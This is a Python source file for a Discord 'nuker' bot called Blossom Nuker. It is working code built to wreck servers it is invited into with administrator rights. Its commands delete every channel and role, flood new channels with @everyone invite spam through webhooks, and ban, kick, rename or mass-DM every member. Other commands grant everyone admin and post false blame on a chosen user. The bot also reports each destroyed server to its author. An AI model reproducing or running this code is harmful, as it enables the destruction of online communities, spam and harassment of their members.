import discord
from discord.ext import commands
import asyncio
import random
import time
import aiohttp
import os
from collections import deque
from dotenv import load_dotenv
from colorama import Fore, init

init(autoreset=True)
load_dotenv()

TOKEN = os.getenv("DISCORD_TOKEN")

if not TOKEN:
    print(f"{Fore.RED}[ERROR] No DISCORD_TOKEN found in .env file!")
    exit(1)

# ============================================================
#  INTENTS
# ============================================================
intents = discord.Intents.all()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.guild_messages = True

# ============================================================
#  BOT INITIALIZATION - NO SLASH COMMANDS
# ============================================================
client = commands.Bot(
    command_prefix=";", 
    intents=intents, 
    help_command=None,
    application_id=None
)

# ============================================================
#  CONFIGURATION
# ============================================================
REPORT_CHANNEL_ID = 1516330515110559765
INVITE_TEXT = "discord.gg/Gx9b3AsJR3"
SPAM_MESSAGE = f"@everyone {INVITE_TEXT} owns ur server pussy"
OWNER_ID = 1446215395358015559
whitelisted_servers = set()

# ============================================================
#  RATE LIMIT TRACKER
# ============================================================
class RateLimiter:
    def __init__(self, max_requests_per_second=15):
        self.max_requests = max_requests_per_second
        self.timestamps = deque(maxlen=max_requests_per_second * 2)
        self.lock = asyncio.Lock()
    
    async def wait_if_needed(self):
        async with self.lock:
            now = time.time()
            while self.timestamps and now - self.timestamps[0] > 1.0:
                self.timestamps.popleft()
            
            if len(self.timestamps) >= self.max_requests:
                oldest = self.timestamps[0]
                wait_time = 1.0 - (now - oldest) + 0.1
                if wait_time > 0:
                    await asyncio.sleep(wait_time)
            
            self.timestamps.append(time.time())

rate_limiter = RateLimiter(max_requests_per_second=15)

# ============================================================
#  GLOBAL CHECK FOR WHITELISTED SERVERS
# ============================================================
async def whitelist_check(ctx):
    if ctx.guild and ctx.guild.id in whitelisted_servers:
        if ctx.command.name not in ["getbot", "credits", "whitelist"]:
            try:
                await ctx.send("Server is whitelisted. Only ;getbot and ;credits work.", delete_after=5)
            except:
                pass
            return False
    return True

client.add_check(whitelist_check)

# ============================================================
#  BOT EVENTS
# ============================================================
@client.event
async def on_ready():
    print(f"{Fore.MAGENTA}██╗      ██████╗ ██╗   ██╗███████╗██╗      █████╗  ██████╗███████╗")
    print(f"{Fore.MAGENTA}██║     ██╔═══██╗██║   ██║██╔════╝██║     ██╔══██╗██╔════╝██╔════╝")
    print(f"{Fore.MAGENTA}██║     ██║   ██║██║   ██║█████╗  ██║     ███████║██║     █████╗")
    print(f"{Fore.MAGENTA}██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██║     ██╔══██║██║     ██╔══╝")
    print(f"{Fore.MAGENTA}███████╗╚██████╔╝ ╚████╔╝ ███████╗███████╗██║  ██║╚██████╗███████╗")
    print(f"{Fore.MAGENTA}╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝")
    print(f"{Fore.MAGENTA}[1] ;nuke - Maximum speed nuke")
    print(f"{Fore.MAGENTA}[2] ;help - Displays commands")
    print(f"{Fore.MAGENTA}[3] ;blame @user - Accuses someone")
    print(f"{Fore.MAGENTA}[4] ;kicka - Kicks all bots")
    print(f"{Fore.MAGENTA}[5] ;credits - Shows socials")
    print(f"{Fore.MAGENTA}[6] ;nothing - nothing left")
    print(f"{Fore.GREEN}[+] Bot is ready! Logged in as {client.user}")
    print(f"{Fore.GREEN}[+] Guilds: {len(client.guilds)}")
    print(f"{Fore.GREEN}[+] Commands loaded: {len(client.commands)}")
    print(f"{Fore.GREEN}[+] Slash commands disabled.")

@client.event
async def on_error(event, *args, **kwargs):
    """Log errors with retry_after info if available."""
    import traceback
    print(f"{Fore.RED}[ERROR] Exception in {event}:")
    traceback.print_exc()

# ============================================================
#  WEBHOOK SPAM FUNCTION
# ============================================================
async def webhook_spam(channel, count=20):
    """Create webhook and spam messages through it."""
    sent = 0
    try:
        webhook = await channel.create_webhook(name="spam")
        for _ in range(count):
            try:
                await webhook.send(SPAM_MESSAGE)
                sent += 1
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = e.response.headers.get('Retry-After', 'unknown')
                    print(f"{Fore.RED}[RATE LIMIT] 429 error - Retry-After: {retry_after} seconds")
                pass
            except:
                pass
        await webhook.delete()
    except discord.HTTPException as e:
        if e.status == 429:
            retry_after = e.response.headers.get('Retry-After', 'unknown')
            print(f"{Fore.RED}[RATE LIMIT] 429 error - Retry-After: {retry_after} seconds")
        pass
    except:
        pass
    return sent

async def webhook_spam_all(channels, per_channel=20):
    """Spam all channels using webhooks."""
    total = 0
    tasks = []
    for c in channels:
        tasks.append(webhook_spam(c, per_channel))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for r in results:
        if isinstance(r, int):
            total += r
    return total

# ============================================================
#  MAXIMUM SPEED NUKE COMMAND - WEBHOOK SPAM
# ============================================================
@client.command(name="nuke")
async def nuke(ctx):
    """Maximum speed nuke - deletes everything, creates 125 channels, webhook spam."""
    if not ctx.guild:
        try:
            await ctx.send("Use this command in a server.", delete_after=5)
        except:
            pass
        return
    
    if not ctx.guild.me.guild_permissions.administrator:
        try:
            await ctx.send("Need Administrator permissions.", delete_after=5)
        except:
            pass
        return
    
    guild = ctx.guild
    try:
        await ctx.send("Nuking at maximum speed...")
    except:
        pass
    print(f"[NUKE] Starting on {guild.name} ({guild.id}) by {ctx.author}")

    # Phase 1: Delete all channels and roles in parallel
    delete_tasks = []
    for c in guild.channels:
        delete_tasks.append(c.delete())
    for r in guild.roles:
        if r.name != "@everyone":
            delete_tasks.append(r.delete())
    
    await asyncio.gather(*delete_tasks, return_exceptions=True)
    print("[NUKE] Deleted all channels and roles")

    # Phase 2: Create 125 channels
    create_tasks = []
    for i in range(125):
        create_tasks.append(guild.create_text_channel(f"rekt-{i}"))
    create_tasks.append(guild.edit(name="nuked"))
    
    results = await asyncio.gather(*create_tasks, return_exceptions=True)
    channels = [r for r in results if isinstance(r, discord.TextChannel)]
    print(f"[NUKE] Created {len(channels)} channels")

    # Phase 3: WEBHOOK SPAM - 50 messages per channel via webhooks
    if channels:
        print(f"[NUKE] Webhook spamming {len(channels)} channels with 50 messages each...")
        total_sent = await webhook_spam_all(channels, per_channel=50)
        print(f"[NUKE] Sent {total_sent} webhook messages")

    # Phase 4: Create 50 roles
    role_tasks = []
    for i in range(50):
        role_tasks.append(guild.create_role(name=f"r-{i}"))
    await asyncio.gather(*role_tasks, return_exceptions=True)
    print("[NUKE] Created 50 roles")

    # Phase 5: Report to log channel
    try:
        report_channel = client.get_channel(REPORT_CHANNEL_ID)
        if report_channel:
            embed = discord.Embed(
                title="Nuke command used",
                description=f"Server nuked.",
                color=discord.Color.red()
            )
            embed.add_field(name="Server", value=guild.name, inline=False)
            embed.add_field(name="Members", value=str(guild.member_count), inline=False)
            embed.add_field(name="ID", value=str(guild.id), inline=False)
            embed.add_field(name="Executor", value=f"{ctx.author} ({ctx.author.id})", inline=False)
            await report_channel.send(embed=embed)
    except discord.HTTPException as e:
        if e.status == 429:
            retry_after = e.response.headers.get('Retry-After', 'unknown')
            print(f"{Fore.RED}[RATE LIMIT] 429 error - Retry-After: {retry_after} seconds")
        pass
    except:
        pass

    try:
        await ctx.send(f"Nuke complete. {len(channels)} channels created. {total_sent if channels else 0} webhook messages sent.", delete_after=10)
    except:
        pass

# ============================================================
#  OTHER COMMANDS
# ============================================================
@client.command(name="hiroshima")
async def hiroshima(ctx):
    """Alias for ;nuke"""
    await nuke(ctx)

@client.command(name="spaminvite")
async def spaminvite(ctx, amount: int = 25):
    if not ctx.guild:
        try:
            await ctx.send("Use this command in a server.", delete_after=5)
        except:
            pass
        return
    if amount <= 0:
        amount = 1
    channels = [channel for channel in ctx.guild.text_channels if channel.permissions_for(ctx.me).send_messages]
    if not channels:
        try:
            await ctx.send("No writable channels found.", delete_after=5)
        except:
            pass
        return
    try:
        await ctx.send(f"Spamming...", delete_after=5)
    except:
        pass
    sent = 0
    for channel in channels:
        for _ in range(amount):
            try:
                await channel.send(SPAM_MESSAGE)
                sent += 1
                await asyncio.sleep(0.1)
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = e.response.headers.get('Retry-After', 'unknown')
                    print(f"{Fore.RED}[RATE LIMIT] 429 error - Retry-After: {retry_after} seconds")
                pass
            except:
                pass
    try:
        await ctx.send(f"Sent {sent} messages.", delete_after=10)
    except:
        pass

@client.command(name="kicka")
async def kicka(ctx, member: discord.Member = None):
    if not ctx.guild:
        try:
            await ctx.send("Use this command in a server.", delete_after=5)
        except:
            pass
        return

    if member is not None:
        if member == ctx.author:
            try:
                await ctx.send("You can't kick yourself.", delete_after=5)
            except:
                pass
            return
        if member.top_role >= ctx.author.top_role and ctx.author != ctx.guild.owner:
            try:
                await ctx.send("You can't kick someone with a higher or equal role.", delete_after=5)
            except:
                pass
            return
        try:
            await member.kick(reason=f"Kicked by {ctx.author}")
            try:
                await ctx.send(f"Kicked {member.mention}", delete_after=5)
            except:
                pass
        except discord.Forbidden:
            try:
                await ctx.send("I don't have permission to kick that member.", delete_after=5)
            except:
                pass
        except Exception as e:
            try:
                await ctx.send(f"Error: {e}", delete_after=5)
            except:
                pass
        return

    if not ctx.author.guild_permissions.kick_members:
        try:
            await ctx.send("You need the Kick Members permission.", delete_after=5)
        except:
            pass
        return

    target_bots = [m for m in ctx.guild.members if m.bot and m.id != ctx.guild.me.id]
    if not target_bots:
        try:
            await ctx.send("No bots found to kick.", delete_after=5)
        except:
            pass
        return

    try:
        await ctx.send(f"Kicking {len(target_bots)} bot(s)...", delete_after=5)
    except:
        pass
    kicked = 0
    failed = 0
    for m in target_bots:
        try:
            await m.kick(reason=f"Kicked by {ctx.author}")
            kicked += 1
        except Exception:
            failed += 1
    try:
        await ctx.send(f"Kicked {kicked} bot(s). {failed} failed.", delete_after=10)
    except:
        pass

@client.command(name="blame")
async def blame(ctx, member: discord.Member = None):
    """Blame someone for nuking the server."""
    if not ctx.guild:
        try:
            await ctx.send("Use this command in a server.", delete_after=5)
        except:
            pass
        return
    
    try:
        await ctx.message.delete()
    except:
        pass
    
    target = member or ctx.author
    try:
        await ctx.send(f"Blossom Nuker: {target.mention} Nuked the server", delete_after=10)
    except:
        pass

@client.command(name="credits")
async def credits(ctx):
    try:
        await ctx.send("Bot created by 6syj on discord")
        await ctx.send("Get bot here: .gg/a6PrNZDP57")
    except:
        pass

INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1515950695679787008&permissions=8&integration_type=0&scope=bot"

@client.command(name="getbot")
async def getbot(ctx):
    view = discord.ui.View()
    view.add_item(discord.ui.Button(label="Invite Bot", url=INVITE_URL, style=discord.ButtonStyle.link))
    embed = discord.Embed(
        title="Invite this bot",
        description="Click the button below to invite the bot to your server.",
        color=discord.Color.blue(),
    )
    try:
        await ctx.send(embed=embed, view=view)
    except:
        pass

@client.command(name="whitelist")
async def whitelist(ctx, action: str, guild_id: int = None):
    if ctx.author.id != OWNER_ID:
        try:
            await ctx.send("Restricted to bot owner.", delete_after=5)
        except:
            pass
        return

    if action.lower() == "add":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.add(guild_id)
        try:
            await ctx.send(f"Server `{guild_id}` whitelisted.", delete_after=5)
        except:
            pass
    elif action.lower() == "remove":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.discard(guild_id)
        try:
            await ctx.send(f"Server `{guild_id}` removed from whitelist.", delete_after=5)
        except:
            pass
    elif action.lower() == "list":
        if whitelisted_servers:
            try:
                await ctx.send(f"Whitelisted: {', '.join(str(g) for g in whitelisted_servers)}", delete_after=10)
            except:
                pass
        else:
            try:
                await ctx.send("No whitelisted servers.", delete_after=5)
            except:
                pass
    else:
        try:
            await ctx.send("Usage: `;whitelist add [guild_id]`, `;whitelist remove [guild_id]`, or `;whitelist list`", delete_after=5)
        except:
            pass

@client.command(name="nothing")
async def nothing(ctx):
    if not ctx.guild:
        try:
            await ctx.send("Use this command in a server.", delete_after=5)
        except:
            pass
        return
    
    try:
        await ctx.send("Deleting everything...", delete_after=5)
    except:
        pass
    guild = ctx.guild
    
    for channel in list(guild.channels):
        try:
            await channel.delete()
        except:
            pass
    
    for role in list(guild.roles):
        if role.name != "@everyone":
            try:
                await role.delete()
            except:
                pass
    
    try:
        await ctx.send("Everything deleted.", delete_after=10)
    except:
        pass

@client.command(name="banall")
async def banall(ctx):
    if not ctx.guild:
        try:
            await ctx.send("Use this command in a server.", delete_after=5)
        except:
            pass
        return
    if not ctx.author.guild_permissions.ban_members:
        try:
            await ctx.send("You need Ban Members permission.", delete_after=5)
        except:
            pass
        return
    try:
        await ctx.send(f"Banning {len(ctx.guild.members)} members...", delete_after=5)
    except:
        pass
    banned = 0
    failed = 0
    for member in list(ctx.guild.members):
        if member == ctx.guild.owner:
            continue
        if member == ctx.author:
            continue
        try:
            await member.ban(reason="Banall command")
            banned += 1
            await asyncio.sleep(0.2)
        except:
            failed += 1
    try:
        await ctx.send(f"Banned {banned} members. {failed} failed.", delete_after=10)
    except:
        pass

@client.command(name="dmall")
async def dmall(ctx, *, message: str = "You have been nuked."):
    if not ctx.guild:
        try:
            await ctx.send("Use this command in a server.", delete_after=5)
        except:
            pass
        return
    try:
        await ctx.send(f"Dming {len(ctx.guild.members)} members...", delete_after=5)
    except:
        pass
    sent = 0
    failed = 0
    for member in list(ctx.guild.members):
        if member.bot:
            continue
        try:
            await member.send(message)
            sent += 1
            await asyncio.sleep(0.3)
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = e.response.headers.get('Retry-After', 'unknown')
                print(f"{Fore.RED}[RATE LIMIT] 429 error - Retry-After: {retry_after} seconds")
            failed += 1
        except:
            failed += 1
    try:
        await ctx.send(f"Dmed {sent} members. {failed} failed.", delete_after=10)
    except:
        pass

@client.command(name="roles")
async def roles(ctx, count: int = 100):
    if not ctx.guild:
        try:
            await ctx.send("Use this command in a server.", delete_after=5)
        except:
            pass
        return
    if count > 250:
        count = 250
    try:
        await ctx.send(f"Creating {count} roles...", delete_after=5)
    except:
        pass
    created = 0
    failed = 0
    colors = [0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0xFF00FF, 0x00FFFF]
    for i in range(count):
        try:
            color = random.choice(colors)
            await ctx.guild.create_role(name=f"role-{i}", color=color)
            created += 1
            if i % 10 == 0:
                await asyncio.sleep(0.1)
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = e.response.headers.get('Retry-After', 'unknown')
                print(f"{Fore.RED}[RATE LIMIT] 429 error - Retry-After: {retry_after} seconds")
            failed += 1
        except:
            failed += 1
    try:
        await ctx.send(f"Created {created} roles. {failed} failed.", delete_after=10)
    except:
        pass

@client.command(name="op")
async def op(ctx, member: discord.Member = None):
    if not ctx.guild:
        try:
            await ctx.send("Use this command in a server.", delete_after=5)
        except:
            pass
        return
    target = member or ctx.author
    if target == ctx.guild.owner:
        try:
            await ctx.send("Cannot OP the server owner.", delete_after=5)
        except:
            pass
        return
    try:
        admin_role = discord.utils.get(ctx.guild.roles, name="Admin")
        if not admin_role:
            admin_role = await ctx.guild.create_role(name="Admin", permissions=discord.Permissions.all())
        await target.add_roles(admin_role)
        try:
            await ctx.send(f"{target.mention} now has Administrator.", delete_after=5)
        except:
            pass
    except:
        try:
            await ctx.send("Failed to give OP. Missing permissions.", delete_after=5)
        except:
            pass

@client.command(name="del")
async def del_channels(ctx):
    if not ctx.guild:
        try:
            await ctx.send("Use this command in a server.", delete_after=5)
        except:
            pass
        return
    try:
        await ctx.send("Deleting all channels...", delete_after=5)
    except:
        pass
    deleted = 0
    failed = 0
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            deleted += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    try:
        await ctx.send(f"Deleted {deleted} channels. {failed} failed.", delete_after=10)
    except:
        pass

@client.command(name="rename")
async def rename_all(ctx, *, new_name: str = "nuked"):
    if not ctx.guild:
        try:
            await ctx.send("Use this command in a server.", delete_after=5)
        except:
            pass
        return
    if not ctx.author.guild_permissions.manage_nicknames:
        try:
            await ctx.send("You need Manage Nicknames permission.", delete_after=5)
        except:
            pass
        return
    try:
        await ctx.send(f"Renaming {len(ctx.guild.members)} members to '{new_name}'...", delete_after=5)
    except:
        pass
    renamed = 0
    failed = 0
    for member in list(ctx.guild.members):
        if member == ctx.guild.owner:
            continue
        try:
            await member.edit(nick=new_name)
            renamed += 1
            await asyncio.sleep(0.2)
        except:
            failed += 1
    try:
        await ctx.send(f"Renamed {renamed} members. {failed} failed.", delete_after=10)
    except:
        pass

@client.command(name="kickall")
async def kickall(ctx):
    if not ctx.guild:
        try:
            await ctx.send("Use this command in a server.", delete_after=5)
        except:
            pass
        return
    if not ctx.author.guild_permissions.kick_members:
        try:
            await ctx.send("You need Kick Members permission.", delete_after=5)
        except:
            pass
        return
    try:
        await ctx.send(f"Kicking {len(ctx.guild.members)} members...", delete_after=5)
    except:
        pass
    kicked = 0
    failed = 0
    for member in list(ctx.guild.members):
        if member == ctx.guild.owner:
            continue
        if member == ctx.author:
            continue
        try:
            await member.kick(reason="Kickall command")
            kicked += 1
            await asyncio.sleep(0.2)
        except:
            failed += 1
    try:
        await ctx.send(f"Kicked {kicked} members. {failed} failed.", delete_after=10)
    except:
        pass

@client.command(name="unbanall")
async def unbanall(ctx):
    if not ctx.guild:
        try:
            await ctx.send("Use this command in a server.", delete_after=5)
        except:
            pass
        return
    if not ctx.author.guild_permissions.ban_members:
        try:
            await ctx.send("You need Ban Members permission.", delete_after=5)
        except:
            pass
        return
    try:
        await ctx.send("Unbanning all banned members...", delete_after=5)
    except:
        pass
    unbanned = 0
    failed = 0
    try:
        bans = [entry async for entry in ctx.guild.bans()]
        for ban_entry in bans:
            try:
                await ctx.guild.unban(ban_entry.user)
                unbanned += 1
                await asyncio.sleep(0.2)
            except:
                failed += 1
    except:
        try:
            await ctx.send("Failed to fetch ban list.", delete_after=5)
        except:
            pass
        return
    try:
        await ctx.send(f"Unbanned {unbanned} members. {failed} failed.", delete_after=10)
    except:
        pass

@client.command(name="droles")
async def droles(ctx):
    if not ctx.guild:
        try:
            await ctx.send("Use this command in a server.", delete_after=5)
        except:
            pass
        return
    try:
        await ctx.send("Deleting all roles...", delete_after=5)
    except:
        pass
    deleted = 0
    failed = 0
    for role in list(ctx.guild.roles):
        if role.name == "@everyone":
            continue
        try:
            await role.delete()
            deleted += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    try:
        await ctx.send(f"Deleted {deleted} roles. {failed} failed.", delete_after=10)
    except:
        pass

@client.command(name="adminall")
async def adminall(ctx):
    if not ctx.guild:
        try:
            await ctx.send("Use this command in a server.", delete_after=5)
        except:
            pass
        return
    if not ctx.author.guild_permissions.administrator:
        try:
            await ctx.send("You need Administrator permission.", delete_after=5)
        except:
            pass
        return
    try:
        await ctx.send(f"Giving admin to {len(ctx.guild.members)} members...", delete_after=5)
    except:
        pass
    admin_role = discord.utils.get(ctx.guild.roles, name="Admin")
    if not admin_role:
        try:
            admin_role = await ctx.guild.create_role(name="Admin", permissions=discord.Permissions.all())
        except:
            try:
                await ctx.send("Failed to create Admin role.", delete_after=5)
            except:
                pass
            return
    given = 0
    failed = 0
    for member in list(ctx.guild.members):
        if member == ctx.guild.owner:
            continue
        try:
            await member.add_roles(admin_role)
            given += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    try:
        await ctx.send(f"Gave admin to {given} members. {failed} failed.", delete_after=10)
    except:
        pass

# ============================================================
#  RUN BOT
# ============================================================
print(f"{Fore.YELLOW}[+] Starting Blossom Nuker...")
client.run(TOKEN)

